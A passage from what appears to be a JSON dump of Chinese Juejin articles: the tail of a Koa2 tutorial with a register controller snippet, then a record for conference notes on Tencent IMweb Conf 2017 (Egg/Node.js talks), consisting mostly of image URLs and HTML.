}\n      \u003cspan class=\"hljs-keyword\"\u003ereturn\u003c/span\u003e data\n    }\n  }\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e修改 controller/home.js\u003c/h3\u003e\n\u003cpre\u003e\u003ccode class=\"hljs js\" lang=\"js\"\u003e\u003cspan class=\"hljs-comment\"\u003e// 引入 service 文件\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003econst\u003c/span\u003e HomeService = \u003cspan class=\"hljs-built_in\"\u003erequire\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'../service/home'\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003emodule\u003c/span\u003e.exports = {\n  \u003cspan class=\"hljs-comment\"\u003e// ……省略上面代码\u003c/span\u003e\n  \u003cspan class=\"hljs-comment\"\u003e// 重写 register 方法 \u003c/span\u003e\n  register: \u003cspan class=\"hljs-keyword\"\u003easync\u003c/span\u003e(ctx, next) =\u0026gt; {\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e {\n      name,\n      password\n    } = ctx.request.body\n    \u003cspan class=\"hljs-keyword\"\u003elet\u003c/span\u003e data = \u003cspan class=\"hljs-keyword\"\u003eawait\u003c/span\u003e HomeService.register(name, password)\n    ctx.response.body = data\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 class=\"heading\"\u003e\u003cstrong\u003e重构完成\u003c/strong\u003e\u003c/h3\u003e\n\u003cp\u003e下一节我们将引入视图层 \u003ccode\u003eviews\u003c/code\u003e，还会介绍使用第三方中间件来设置静态资源目录等。新增的部分前端资源代码会让我们的用例更加生动，尽情期待吧。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e下一篇：视图nunjucks——Koa 默认支持的模板引擎\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/12/14/1605309af5a7dfa2?w=1426\u0026amp;h=778\u0026amp;f=png\u0026amp;s=414615\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cp\u003e\u003c/p\u003e\u003cfigure\u003e\u003cimg src=\"https://dn-mhke0kuv.qbox.me/3326ff01e1f06fd6dc3c.png\"\u003e\u003cfigcaption\u003e\u003c/figcaption\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e上一篇：iKcamp新课程推出啦～～～～～\u003ca target=\"_blank\" href=\"https://juejin.im/post/5a448f316fb9a04504082e2a\"\u003eiKcamp｜基于Koa2搭建Node.js实战（含视频）☞ HTTP请求\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2 class=\"heading\"\u003e推荐： 翻译项目Master的自述：\u003c/h2\u003e\n\u003ch3 class=\"heading\"\u003e1. \u003ca target=\"_blank\" href=\"https://juejin.im/post/59e87bef5188255ea95b1077\"\u003e干货｜人人都是翻译项目的Master\u003c/a\u003e\u003c/h3\u003e\n\u003ch3 class=\"heading\"\u003e2. \u003ca target=\"_blank\"\u003eiKcamp出品微信小程序教学共5章16小节汇总(含视频)\u003c/a\u003e\u003c/h3\u003e\n","buildTime":"1514979708.0706","__v":0}
{"_id":{"$oid":"5a4b774a85b30d097483e991"},"id":"59bdd93f6fb9a00a562e734c","author":{"$oid":"5a4b774a85b30d097483e983"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2017/9/17/b5f1e9e2b4e2a40a245dfcfa11eebf63","https://user-gold-cdn.xitu.io/2017/9/17/f7f47934273e6ca73c3a294e321456f8","https://user-gold-cdn.xitu.io/2017/9/17/1f20bde35dfefcbb4f47293023f1d7f6","https://user-gold-cdn.xitu.io/2017/9/17/e4a1d49da901ff64b65bedc324cb71ff","https://user-gold-cdn.xitu.io/2017/9/17/962387f60f113be8e84fda8f7ae6d860","https://user-gold-cdn.xitu.io/2017/9/17/416ee3e340dab0082cfb01117b3aa37b","https://user-gold-cdn.xitu.io/2017/9/17/232a4b75b125cf29e0b267a565f962f9","https://user-gold-cdn.xitu.io/2017/9/17/a8ade95dd001393449202dbafbc7a32d","https://user-gold-cdn.xitu.io/2017/9/17/0c02b161d7a258e8bc36d772234cee4d","https://user-gold-cdn.xitu.io/2017/9/17/badb05ecf7d1aa53d2c94bf0aefbe4bf","https://user-gold-cdn.xitu.io/2017/9/17/fba1cb6933074b7ff9ac546a9d5a79eb","https://user-gold-cdn.xitu.io/2017/9/17/0061b8fc0010bf2b49a0d9574006c114","https://user-gold-cdn.xitu.io/2017/9/17/715a978ac89e6aa911d6ff8d782b9d8b","https://user-gold-cdn.xitu.io/2017/9/17/2adf0ae7918463fd9b1f4c24531f8ced","https://user-gold-cdn.xitu.io/2017/9/17/f5d4364e746b4d3126ad43c7b58beeff","https://user-gold-cdn.xitu.io/2017/9/17/36e765d52333a63375bd639dc22885a1","https://user-gold-cdn.xitu.io/2017/9/17/7313a990d85419080f86ae1d4f35792b","https://user-gold-cdn.xitu.io/2017/9/17/eda24d893911bf60af414601a29ce5e7","https://user-gold-cdn.xitu.io/2017/9/17/f155186b3a8def9970d8da117f2e0ed8","https://user-gold-cdn.xitu.io/2017/9/17/998036ef765376092bcb785787ab8197","https://user-gold-cdn.xitu.io/2017/9/17/339aafd5fc03d01291cbf75328bb77b8","https://user-gold-cdn.xitu.io/2017/9/17/b54dbdc870f952c6fde43001545be6aa","https://user-gold-cdn.xitu.io/2017/9/17/367630786102264003f08e62767fa6df","https://user-gold-cdn.xitu.io/2017/9/17/4e163a025c313f24a08fca15c9f8ba63","https://user-gold-cdn.xitu.io/2017/9/17/17354884a601394abdc64e29280aa430","https://user-gold-cdn.xitu.io/2017/9/17/ce0c397ef8fe25d6bef40b8067a71ff8","https://user-gold-cdn.xitu.io/2017/9/17/8e0409a4360f123545395ef4191b0c79","https://user-gold-cdn.xitu.io/2017/9/17/bc497f7f9bd9499b26981a20d92475ba","https://user-gold-cdn.xitu.io/2017/9/17/5a2f7c5cfdd7c05e06e1b721086bfc6d","https://user-gold-cdn.xitu.io/2017/9/17/508dac1581850798a632ce1902eeab65","https://user-gold-cdn.xitu.io/2017/9/17/dbfc31f415e2a86450b16f9e150a89e6","https://user-gold-cdn.xitu.io/2017/9/17/23b6db2725c743a50c2442e4a6774c08","https://user-gold-cdn.xitu.io/2017/9/17/a52343a4aa7615b515b8a3d928b9cbb9","https://user-gold-cdn.xitu.io/2017/9/17/195281164eedd864b94f56ab4cba8d6a","https://user-gold-cdn.xitu.io/2017/9/17/5ea9d9ae972ec1580fdeb6fffa6cd2b4","https://user-gold-cdn.xitu.io/2017/9/17/f70510eb7600560411a0f3e0ff93c416","https://user-gold-cdn.xitu.io/2017/9/17/7bf9b7099f35a8a639285780cf912961","https://user-gold-cdn.xitu.io/2017/9/17/8628882805fb9349df326160088fad99","https://user-gold-cdn.xitu.io/2017/9/17/f33aaf763745dbd15d2db6154cf0f2b8","https://user-gold-cdn.xitu.io/2017/9/17/629c00450a0eef25760ebaa2dcbd40d3","https://user-gold-cdn.xitu.io/2017/9/17/98dcea255f9a851e052f576277797146","https://user-gold-cdn.xitu.io/2017/9/17/b438786525539013342949285e1c4af6","https://user-gold-cdn.xitu.io/2017/9/17/eb10dd2cc7c936ed2c4c9a7788db9b9b","https://user-gold-cdn.xitu.io/2017/9/17/6a571ac5e5c031ce0f32f7350577d91e","https://user-gold-cdn.xitu.io/2017/9/17/77c84ab9881030e2a7f083621dbaf469","https://user-gold-cdn.xitu.io/2017/9/17/cab34055cd8707b297d7282526481028","https://user-gold-cdn.xitu.io/2017/9/17/192812fcea5a365c9e16d8678dfd8199","https://user-gold-cdn.xitu.io/2017/9/17/567e609419df4a1595f7760c49d439fd","https://user-gold-cdn.xitu.io/2017/9/17/28ea3fbaafa619a8af57b1d458db8754","https://user-gold-cdn.xitu.io/2017/9/17/b2d12235f1fff0999c3641c517ea25fb","https://user-gold-cdn.xitu.io/2017/9/17/b17b721ce4f3fb1e6dd71fa8cc5f4c94","https://user-gold-cdn.xitu.io/2017/9/17/bc85a4487dde80324a568450f4b89ea1","https://user-gold-cdn.xitu.io/2017/9/17/59bc94408e7ec9b7c69406a411bcd84e","https://user-gold-cdn.xitu.io/2017/9/17/1efc5edf26b0253b9aefbed02b388834","https://user-gold-cdn.xitu.io/2017/9/17/97fffee822fb4a796823137bc4f727ec","https://user-gold-cdn.xitu.io/2017/9/17/31968d95f11095704f432980f6ebb822","https://user-gold-cdn.xitu.io/2017/9/17/b0a6d02e3b084076ac53c7acd8ef0d44","https://user-gold-cdn.xitu.io/2017/9/17/8f0ceb24ba611037b9d41bcf98f7c08c","https://user-gold-cdn.xitu.io/2017/9/17/9754e59f84acc6ef52568bae9805c886","https://user-gold-cdn.xitu.io/2017/9/17/86ad9b18b355159fd91f725a36506119","https://user-gold-cdn.xitu.io/2017/9/17/ff55997e45fc1cede699c14376e88916","https://user-gold-cdn.xitu.io/2017/9/17/1a92d98548bcb67490fc198ef155adda","https://user-gold-cdn.xitu.io/2017/9/17/32181164fc4ac99e2475f3918264311d","https://user-gold-cdn.xitu.io/2017/9/17/f61507d84dcfe34b63f7d40cbb9042ce","https://user-gold-cdn.xitu.io/2017/9/17/b4944d4ed21159dc8537f3e0ff80a236","https://user-gold-cdn.xitu.io/2017/9/17/d37304fcfc9ae04e08b0e30c42bc4108","https://user-gold-cdn.xitu.io/2017/9/17/fe457d2fae699e485ec4424f39486099","https://user-gold-cdn.xitu.io/2017/9/17/03f803f30cd75d42c6d265b7641f6cd5","https://user-gold-cdn.xitu.io/2017/9/17/e7d7c4f2f1758f00eb0a67cedbedacac","https://user-gold-cdn.xitu.io/2017/9/17/341a7d4bdcd05fc666050dcff2483bec","https://user-gold-cdn.xitu.io/2017/9/17/c3a2cd037e6836289301f2d2ba311bc1","https://user-gold-cdn.xitu.io/2017/9/18/10e796cb83407101c3f483201e5283ce","https://user-gold-cdn.xitu.io/2017/9/18/8c1cddc934cfe27592e158d6c81c417d","https://user-gold-cdn.xitu.io/2017/9/18/aaf39e3d17ee3918db9db09b3e2a4246","https://user-gold-cdn.xitu.io/2017/9/18/cc3036afe5b7555368ba3349a973e745","https://user-gold-cdn.xitu.io/2017/9/18/127ad1eaee9fd2ccfdc0c9349f213c00","https://user-gold-cdn.xitu.io/2017/9/18/cad450471a320a5b526a4647b2617fec","https://user-gold-cdn.xitu.io/2017/9/18/1fd2e08e4fcd327525433b9eb9bc47ef","https://user-gold-cdn.xitu.io/2017/9/18/2bbf06fa78a121547a8d64ef5d972e57","https://user-gold-cdn.xitu.io/2017/9/18/73316212396f73910bf61bdd1645fe9e","https://user-gold-cdn.xitu.io/2017/9/18/a39732a85817df8d3dac6751ea766751","https://user-gold-cdn.xitu.io/2017/9/18/65a5941653fc3c5cafe028e5c07b2b4a","https://user-gold-cdn.xitu.io/2017/9/18/8b7502ce214d37706c0a6a8259530c70","https://user-gold-cdn.xitu.io/2017/9/18/c67f84f034341a608cd65942e699cae0","https://user-gold-cdn.xitu.io/2017/9/18/6bb25ced14dca660a97ceaf3b5cea5b1","https://user-gold-cdn.xitu.io/2017/9/18/9977ca56149106f635a791baebd327aa","https://user-gold-cdn.xitu.io/2017/9/18/a0240c1e33660ff99f96f7ef47fb8a4e","https://user-gold-cdn.xitu.io/2017/9/18/dd1745d07f14ec8b315ce5b9f480eb9c","https://user-gold-cdn.xitu.io/2017/9/18/12520cda8ac8c1f5cf8295fe849c2442","https://user-gold-cdn.xitu.io/2017/9/18/fe2e634d6c0102e6c265ea9d73c8131b","https://user-gold-cdn.xitu.io/2017/9/18/dc61de51f6c74de3002e77d6a1f0790d","https://user-gold-cdn.xitu.io/2017/9/18/66429b9624c127a58ec7c2c1ba71ef0b","https://user-gold-cdn.xitu.io/2017/9/18/6792697cb321b57e380fef03a5f25959","https://user-gold-cdn.xitu.io/2017/9/18/e52ee5aad9341c21f79430b0bd88971a","https://user-gold-cdn.xitu.io/2017/9/18/bd5850e5d556709d8372d9032bdabd2c","https://user-gold-cdn.xitu.io/2017/9/18/f1e65898a9adee70842b7026ecab0cd4","https://user-gold-cdn.xitu.io/2017/9/18/99fc30732fe923234d30b047b8d1d005","https://user-gold-cdn.xitu.io/2017/9/18/62594d3536ef0c81bd485091bf0c9eec","https://user-gold-cdn.xitu.io/2017/9/18/c586b9bd5c5bdffe73b0ed95611f798d","https://user-gold-cdn.xitu.io/2017/9/18/20ce7f7514600c525c164c55ec10d713","https://user-gold-cdn.xitu.io/2017/9/18/6f1fe6cac856f7833734d1937955b6d7","https://user-gold-cdn.xitu.io/2017/9/18/37a5c6580bda0a9ce01774493f6643be","https://user-gold-cdn.xitu.io/2017/9/18/fa78ba9d27801287e950b4c2167bacb1","https://user-gold-cdn.xitu.io/2017/9/18/08f9d8b1abb3c88063871dcfe41236a2","https://user-gold-cdn.xitu.io/2017/9/18/b8f50f56de647c11a2399da7a120af61","https://user-gold-cdn.xitu.io/2017/9/18/1a78d50e45b2e5382b398c85bdf1fc34","https://user-gold-cdn.xitu.io/2017/9/18/cbef30e57fc6af74f1f84c824e585f53","https://user-gold-cdn.xitu.io/2017/9/18/7d165cab6a8a1fcb567b927a37a0b5cc","https://user-gold-cdn.xitu.io/2017/9/18/e75b8a4de2b6ab9ad02ce139a0339aaa","https://user-gold-cdn.xitu.io/2017/9/18/eb496f38c58dd8d36c112816ad054d2e","https://user-gold-cdn.xitu.io/2017/9/18/6a520ed408dbe1bcd7a4f07ee7165e47","https://user-gold-cdn.xitu.io/2017/9/18/ecca7982f8bd1105a56c120fa430c0ba","https://user-gold-cdn.xitu.io/2017/9/18/78f5c008a209fef5b72195e72d960821","https://user-gold-cdn.xitu.io/2017/9/18/3489ce3bfba29fa9fec3512d741b6441","https://user-gold-cdn.xitu.io/2017/9/18/e594a9b3a5d5d26685c6be2cc676b9bd","https://user-gold-cdn.xitu.io/2017/9/18/902139b50f84cfe915a80a39348aa141","https://user-gold-cdn.xitu.io/2017/9/18/dde3dfe0b7a7540a8cadf48605d9ef98","https://user-gold-cdn.xitu.io/2017/9/18/355631b2472d379d7c1087b462851135","https://user-gold-cdn.xitu.io/2017/9/18/3e3f88c17f32c77d5c1f1ec8663b1c21","https://user-gold-cdn.xitu.io/2017/9/18/ceca383a63e560815480c1262f11092d","https://user-gold-cdn.xitu.io/2017/9/18/bc7bceabe3172be82545cf00ea4e2380","https://user-gold-cdn.xitu.io/2017/9/18/b3865d781e08a59e39ad61ef581ed848","https://user-gold-cdn.xitu.io/2017/9/18/067b1f488b219324a670704ff18023a3","https://user-gold-cdn.xitu.io/2017/9/18/e78d6246c1d97ba143a8faf8fd576e9c","https://user-gold-cdn.xitu.io/2017/9/18/8d99ec380cd9d5f71b6d1ab98d39afa1","https://user-gold-cdn.xitu.io/2017/9/18/71929988e8f50b9e37eddfca5223c18b","https://user-gold-cdn.xitu.io/2017/9/18/bb77dfd3e4313597fabe3f6948b3cae5","https://user-gold-cdn.xitu.io/2017/9/18/2a1a7d217e1110cde297d8c9cc865fb4","https://user-gold-cdn.xitu.io/2017/9/18/0d199a72d5c24a4343fc917a0087c7a5","https://user-gold-cdn.xitu.io/2017/9/18/ae4f5032fadf863c74797d01434e9b7f","https://user-gold-cdn.xitu.io/2017/9/18/986fb870d308df7fc7655837496e1786","https://user-gold-cdn.xitu.io/2017/9/18/9f57c53159733027e13db1519f730add","https://user-gold-cdn.xitu.io/2017/9/18/ab156b942bafa6946db6789424102236","https://user-gold-cdn.xitu.io/2017/9/18/f696eec79b96dd067d2092ec62c72501","https://user-gold-cdn.xitu.io/2017/9/18/81fa336a2e90a365c64a0c0bf5a67c91","https://user-gold-cdn.xitu.io/2017/9/18/a8312bef3edcfc00b6e4dbcc57804b15","https://user-gold-cdn.xitu.io/2017/9/18/50865ad92245f65d0d6cbffb85507bcc","https://user-gold-cdn.xitu.io/2017/9/18/a63e4aedfc452a111ab09d7ac4788213","https://user-gold-cdn.xitu.io/2017/9/18/f6deaa26bf57fc81dda22da38fbe4834","https://user-gold-cdn.xitu.io/2017/9/18/8c684ef6177013c8c071ecd10a13c888","https://user-gold-cdn.xitu.io/2017/9/18/1a52781f0a083215e81cb864aea317c6","https://user-gold-cdn.xitu.io/2017/9/18/65b1144a6afc11ce2c8fa03d4729fe41","https://user-gold-cdn.xitu.io/2017/9/18/57d120e319e8f1e18b4e9852fc4c191c","https://user-gold-cdn.xitu.io/2017/9/18/fe9763e5b382a8d3a45f99a26370bf12","https://user-gold-cdn.xitu.io/2017/9/18/3a3b2e93275cfcc8a55e8d1e5e52a1b5","https://user-gold-cdn.xitu.io/2017/9/18/9e59cba5e2e4265abd8e1536eb1e7735","https://user-gold-cdn.xitu.io/2017/9/18/6162d15e2964a7accda0a1d5495b0667","https://user-gold-cdn.xitu.io/2017/9/18/5a0dda5974def94c09e3fcd054db34be","https://user-gold-cdn.xitu.io/2017/9/18/edd8eed0fdc2f9ae7e0c1b37d916cd83","https://user-gold-cdn.xitu.io/2017/9/18/f403aceeda760b2f1323b9918179ff3d","https://user-gold-cdn.xitu.io/2017/9/18/1a000535cfa1749afb0aa9acf80f7491","https://user-gold-cdn.xitu.io/2017/9/18/3cc101d630577ed59518de812926cbca","https://user-gold-cdn.xitu.io/2017/9/18/27ad22c351587dfdfd8113df1fee1faf","https://user-gold-cdn.xitu.io/2017/9/18/78636f47f7aef0c65fa9f3c68efaca25","https://user-gold-cdn.xitu.io/2017/9/18/8d5852da7897b58fbf57f392167be463","https://user-gold-cdn.xitu.io/2017/9/18/e06fd1d230e4d1bafda5ad4e200361b6"],"screenShot":null}],"title":"腾讯IMweb Conf 2017大会图文笔记 -- 下","meta":{"likeCount":0},"tag":["Node.js","前端","微信小程序","求职"],"comment":[],"shortContent":"下午的干货就比较多，我主要是在Node分场+小程序架构剖析，其他的没有整理了。 早上的整理链接《腾讯IMweb Conf 2017大会图文笔记 -- 上》。 分享是最好的学习，IMweb Conf 收获良多。 -- 写着写着笔记：突然发现讲师的PDF已经出来了 ，传送门：[gi…","content":"\u003cp\u003e下午的干货就比较多，我主要是在Node分场+小程序架构剖析，其他的没有整理了。\u003c/p\u003e\u003cp\u003e早上的整理链接\u003ca href=\"https://juejin.im/post/59bd3747f265da066875e10d\"\u003e《腾讯IMweb Conf 2017大会图文笔记 -- 上》\u003c/a\u003e。\u003c/p\u003e\u003ch3\u003e目录\u003c/h3\u003e\u003col\u003e\u003cli\u003e《Egg\u0026amp;node从小工坊走向企业级开发》-- 天猪@阿里巴巴\u003cbr\u003e\u003c/li\u003e\u003cli\u003e《WebIM大流量柔性微服务实战》 -- 唐俊俊@腾讯\u003c/li\u003e\u003cli\u003e《小程序你所不知道的：核心架构剖析》-- 王跃@腾讯\u003c/li\u003e\u003cli\u003e《大前端全栈修炼之道--愈演愈烈的Node.js》 -- 狼叔@得到/罗辑思维\u003c/li\u003e\u003cli\u003e\u0026nbsp;圆桌会议分享 -- 问与答\u003c/li\u003e\u003c/ol\u003e分享是最好的学习，IMweb Conf 收获良多。\u003cdiv\u003e\u003cp\u003e--------------------------------------------------------\u003c/p\u003e\u003ch2\u003e一、《Egg\u0026amp;node从小工坊走向企业级开发》--\u0026nbsp;天猪\n\u003c/h2\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b5f1e9e2b4e2a40a245dfcfa11eebf63\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e-- 写着写着笔记：突然发现讲师的PDF已经出来了 ，传送门：\u003ca href=\"https://github.com/atian25/blog/blob/master/assets/files/Egg%20%26%20Node.js%20%E4%BB%8E%E5%B0%8F%E5%B7%A5%E5%9D%8A%E8%B5%B0%E5%90%91%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BC%80%E5%8F%91.pdf\"\u003e[github]《\u003cb\u003eEgg \u0026amp; Node.js 从小工坊走向企业级开发.pdf\u003c/b\u003e》\u003c/a\u003e。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f7f47934273e6ca73c3a294e321456f8\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/1f20bde35dfefcbb4f47293023f1d7f6\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/e4a1d49da901ff64b65bedc324cb71ff\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e大会上说了阿里的Node使用情况、Egg是如何跨团队构建的，Egg版本Timeline，作为补充。\u003c/p\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e-- Egg 寓意“孵化新生”，在它之上可以快速的孕育出各式各样的 Web 应用。官网\u003ca href=\"https://eggjs.org/\"\u003ehttps://eggjs.org/\u003c/a\u003e\u003c/p\u003e\u003cp\u003e-- 一直以来，Node.js以其灵活、快速迭代的特性在阿里内部得到了广泛的应用。Node.js现在不仅替代了过去使用PHP和Jave Web的部分场景，而且还成为了阿里整个框架内基础设施和接入设施的桥梁。但是随着Node应用和Node开发者的数量不断增加，一些问题也随之暴露出来。这里主要体现在以下三点：基建缺失、重复建设和各自为战。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/962387f60f113be8e84fda8f7ae6d860\"\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/416ee3e340dab0082cfb01117b3aa37b\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/232a4b75b125cf29e0b267a565f962f9\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/a8ade95dd001393449202dbafbc7a32d\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/0c02b161d7a258e8bc36d772234cee4d\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/badb05ecf7d1aa53d2c94bf0aefbe4bf\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/fba1cb6933074b7ff9ac546a9d5a79eb\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/0061b8fc0010bf2b49a0d9574006c114\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/715a978ac89e6aa911d6ff8d782b9d8b\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/2adf0ae7918463fd9b1f4c24531f8ced\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f5d4364e746b4d3126ad43c7b58beeff\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/36e765d52333a63375bd639dc22885a1\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/7313a990d85419080f86ae1d4f35792b\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/eda24d893911bf60af414601a29ce5e7\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f155186b3a8def9970d8da117f2e0ed8\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/998036ef765376092bcb785787ab8197\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/339aafd5fc03d01291cbf75328bb77b8\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/b54dbdc870f952c6fde43001545be6aa\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/367630786102264003f08e62767fa6df\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/4e163a025c313f24a08fca15c9f8ba63\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/17354884a601394abdc64e29280aa430\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/ce0c397ef8fe25d6bef40b8067a71ff8\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/8e0409a4360f123545395ef4191b0c79\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/bc497f7f9bd9499b26981a20d92475ba\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/5a2f7c5cfdd7c05e06e1b721086bfc6d\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/508dac1581850798a632ce1902eeab65\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/dbfc31f415e2a86450b16f9e150a89e6\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/23b6db2725c743a50c2442e4a6774c08\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/a52343a4aa7615b515b8a3d928b9cbb9\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/195281164eedd864b94f56ab4cba8d6a\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/5ea9d9ae972ec1580fdeb6fffa6cd2b4\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f70510eb7600560411a0f3e0ff93c416\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/7bf9b7099f35a8a639285780cf912961\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/8628882805fb9349df326160088fad99\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/f33aaf763745dbd15d2db6154cf0f2b8\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/9/17/629c00450a0eef25760ebaa2dcbd40d3\"\u003e\u003cbr\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cdiv\u003e\u003cimg 